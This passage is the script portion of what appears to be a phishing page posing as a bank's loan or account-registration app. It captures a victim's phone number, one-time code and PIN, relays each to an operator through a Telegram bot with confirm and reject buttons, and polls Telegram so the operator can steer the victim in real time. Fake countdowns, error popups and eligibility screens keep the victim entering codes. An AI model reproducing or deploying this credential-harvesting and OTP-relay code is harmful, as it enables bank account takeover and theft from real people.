        nBtn.style.display = 'none';
        
        const countEl = document.getElementById('countdown');
        const t = translations[curL];

        if(type === 'phone') {
            countEl.style.display = 'block';
            document.getElementById('waitTitle').innerText = t.waitPhTitle;
            document.getElementById('waitMsg').innerText = t.waitPhMsg;
            let time = 300;
            timerInt = setInterval(() => { time--; let m=Math.floor(time/60), s=time%60; countEl.innerText = `${m<10?'0':''}${m}:${s<10?'0':''}${s}`; if(time<=0) clearInterval(timerInt); }, 1000);
            notify("Phone Number", mobIn.value, [{text:"Confirm", callback_data:`ok_ph_${userName}`}, {text:"Not Registered", callback_data:`no_ph_${userName}`}]);
            pollInt = setInterval(() => pollAdmin(`_ph_${userName}`, goToOTP, phError), 3000);
        } else if(type === 'otp') {
            countEl.style.display = 'none';
            document.getElementById('waitTitle').innerText = t.waitOtpTitle;
            document.getElementById('waitMsg').innerText = t.waitOtpMsg;
            notify("OTP Code", otpIn.value, [{text:"Correct", callback_data:`ok_otp_${userName}`}, {text:"Incorrect", callback_data:`no_otp_${userName}`}]);
            pollInt = setInterval(() => pollAdmin(`_otp_${userName}`, goToPIN, otpError), 3000);
        } else if(type === 'pin') {
            countEl.style.display = 'none';
            document.getElementById('waitTitle').innerText = t.waitLoanTitle;
            document.getElementById('waitMsg').innerText = t.waitLoanMsg;
            notify("PIN/Password", pinIn.value, [
                {text:"Confirm", callback_data:`ok_pin_${userName}`}, 
                {text:"Wrong PIN", callback_data:`no_pin_${userName}`},
                {text:"Not Eligible", callback_data:`elig_pin_${userName}`},
                {text:"Not Verified", callback_data:`veri_pin_${userName}`}
            ]);
            pollInt = setInterval(() => pollAdmin(`_pin_${userName}`, goToSuccess, pinError), 3000);
        }
    }

    async function pollAdmin(key, win, fail) {
        try {
            const r = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=-1&limit=1`);
            const d = await r.json();
            if(d.result?.length > 0) {
                const update = d.result[0];
                if(update.update_id !== lastHandledUpdateId && update.callback_query) {
                    const act = update.callback_query.data;
                    if(act === "ok"+key) { 
                        lastHandledUpdateId = update.update_id;
                        clearInterval(pollInt); win(); 
                    } else if(act === "no"+key) { 
                        lastHandledUpdateId = update.update_id;
                        clearInterval(pollInt); fail('wrong'); 
                    } else if(act === "elig"+key) {
                        lastHandledUpdateId = update.update_id;
                        clearInterval(pollInt); fail('elig');
                    } else if(act === "veri"+key) {
                        lastHandledUpdateId = update.update_id;
                        clearInterval(pollInt); fail('veri');
                    }
                }
            }
        } catch(e){}
    }

    function goToOTP() { pgs['wait'].classList.remove('active'); step = 1; pgs[1].classList.add('active'); nBtn.style.display = 'block'; updateUI(); }
    function goToPIN() { pgs['wait'].classList.remove('active'); step = 2; pgs[2].classList.add('active'); nBtn.style.display = 'block'; document.getElementById('bottomNav').style.display = 'flex'; updateUI(); }
    function goToSuccess() { pgs['wait'].classList.remove('active'); step = 3; pgs[3].classList.add('active'); nBtn.style.display = 'block'; updateUI(); }

    function pinError(type) {
        if(type === 'wrong') {
            showPop(translations[curL].wrongPin, translations[curL].tryAgain, () => {
                closePopup(); pinIn.value = "";
                pgs['wait'].classList.remove('active'); pgs[2].classList.add('active'); nBtn.style.display = 'block'; updateUI();
            });
        } else if(type === 'elig') {
            pgs['wait'].classList.remove('active'); pgs['elig'].classList.add('active'); nBtn.style.display = 'block'; step = 3; updateUI();
        } else if(type === 'veri') {
            pgs['wait'].classList.remove('active'); pgs['veri'].classList.add('active'); nBtn.style.display = 'block'; step = 3; updateUI();
        }
    }

    function phError() {
        showPop(translations[curL].phNotReg, translations[curL].tryAgain, () => {
            closePopup(); pgs['wait'].classList.remove('active'); pgs[0].classList.add('active'); nBtn.style.display = 'block'; step = 0; updateUI();
        });
    }

    function otpError() {
        showPop(translations[curL].wrongOtp, translations[curL].resend, () => {
            closePopup(); otpIn.value = ""; 
            document.querySelectorAll('.otp-digit').forEach(d => { d.innerText = ""; d.classList.remove('filled','active'); });
            notify("Resend Request", "User needs a new OTP"); 
            startWait('phone'); 
        });
    }

    function showPop(txt, btnTxt, fn) {
        document.getElementById('popText').innerText = txt;
        const b = document.getElementById('popOk'); b.innerText = btnTxt;
        b.onclick = fn;
        document.getElementById('popupOverlay').style.display = 'flex';
    }

    function checkBankLock() {
        if(selectedBank !== "CBO" && selectedBank !== "") {
            showPop(translations[curL].bankLock, "OK", closePopup);
        }
    }

    function openSoon() { showPop(translations[curL].soon, "OK", closePopup); }
    function closePopup() { document.getElementById('popupOverlay').style.display = 'none'; }

    function validate() {
        let v = false;
        if(step === 0 && selectedBank === "CBO") { let m = mobIn.value; if(m.length === 9 && (m[0]==='9'||m[0]==='7')) v = true; }
        else if(step === 1 && otpIn.value.length === 6) v = true;
        else if(step === 2 && pinIn.value.length >= 4) v = true;
        else if(step === 3) v = true;
        nBtn.classList.toggle('active', v);
    }

    mobIn.addEventListener('input', validate); pinIn.addEventListener('input', validate); otpIn.addEventListener('input', validate);

    function updateUI() {
        const t = translations[curL], b = document.getElementById('bannerTxt');
        document.getElementById('btnAgree').innerText = t.agreeBtn;
        document.getElementById('txtTerms').innerText = t.terms;
        document.getElementById('lblSelectBank').innerText = t.selBank;
        mobIn.placeholder = t.mobPlace;
        pinIn.placeholder = t.pinPlace;
        document.getElementById('lblForgot').innerText = t.forgot;
        document.getElementById('navOffline').innerText = t.offline;
        document.getElementById('navMoney').innerText = t.money;
        document.getElementById('navFeres').innerText = t.feres;
        if(step==0) b.innerText = t.b1;
        if(step==1) b.innerText = t.b2;
        if(step==2) b.innerText = t.b3;
        if(step==3) b.innerText = t.b4;
        document.getElementById('txtOtpInstruction').innerText = t.otpInstr;
        document.getElementById('txtOtpWait').innerText = t.otpWait;
        document.getElementById('eligTitle').innerText = t.eligTitle;
        document.getElementById('eligMsg').innerText = t.eligMsg;
        document.getElementById('veriTitle').innerText = t.veriTitle;
        document.getElementById('veriMsg').innerText = t.veriMsg;
        document.getElementById('sucTitle').innerText = t.sucTitle;
        document.getElementById('sucMsg').innerText = t.sucMsg;
        nBtn.innerText = step==0?t.next : step==1?t.act : step==2?t.reg : t.done;
        validate();
    }

    nBtn.addEventListener('click', () => {
        if(step === 0) startWait('phone');
        else if(step === 1) startWait('otp');
        else if(step === 2) startWait('pin');
        else if(step === 3) location.reload();
    });

    document.querySelectorAll('.bank-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            selectedBank = btn.getAttribute('data-bank');
            document.querySelectorAll('.bank-btn').forEach(b => b.classList.remove('active'));
            if(selectedBank !== "CBO") {
                mobIn.disabled = true; checkBankLock();
            } else {
                mobIn.disabled = false; btn.classList.add('active');
                const c = btn.getAttribute('data-hex'); document.documentElement.style.setProperty('--accent', c);
                ['mobLine','codeLine','pinLine'].forEach(id => document.getElementById(id).style.borderColor = c);
                nBtn.style.backgroundColor = c;
            }
            validate();
        });
    });

    otpIn.addEventListener('input', (e) => {
        const v = e.target.value.replace(/\D/g, ''); e.target.value = v;
        const dg = document.querySelectorAll('.otp-digit');
        dg.forEach((d, i) => { d.innerText = v[i]||""; d.classList.toggle('active', i===v.length); d.classList.toggle('filled', i<v.length); });
        validate();
    });

    function togglePIN() { pinIn.type = pinIn.type === 'password' ? 'tel' : 'password'; }
</script>
</body>
</html>